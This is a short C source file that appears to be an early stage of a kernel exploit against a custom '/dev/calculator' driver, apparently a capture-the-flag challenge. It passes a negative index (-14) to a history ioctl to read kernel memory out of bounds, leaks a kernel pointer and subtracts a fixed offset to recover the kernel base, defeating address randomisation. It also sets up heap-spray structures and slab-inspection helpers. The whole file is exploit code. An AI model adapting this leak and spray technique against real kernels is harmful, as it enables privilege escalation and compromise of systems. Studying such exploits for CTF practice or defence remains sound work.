#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <unistd.h>

#include "calc.h"

#define PHYSMEM_KERNEL_BASE_OFFSET 0x777F81000000ULL
#define LEAK_OFFSET 0x83F040
#define SPRAY_SIZE 50

struct msgbuf {
  long mtype;
  char mtext[SPRAY_SIZE];
};

void hold() {
  puts("Press any key to continue...");
  getchar();
}

void slabinfo() {
  system("cat /proc/slabinfo | grep '^kmalloc'");
  hold();
}

void main() {
  int fd = open("/dev/calculator", O_RDWR);

  // slabinfo();

  ioctl(fd, ALLOC_CMD, 0);
  // slabinfo();
  // ioctl(fd, FREE_CMD, 0);

  puts("Leak kernel addr...");
  int64_t history_res;
  struct ioctl_history_arg history_arg;
  history_arg.out = &history_res;
  history_arg.index = -14;

  ioctl(fd, HISTORY_CMD, (void *)&history_arg);
  printf("kernel leak addr: %p\n", *history_arg.out);
  uint64_t kernel_base = *history_arg.out - LEAK_OFFSET;
  printf("kernel base: %p\n", kernel_base);

  // slabinfo();
}
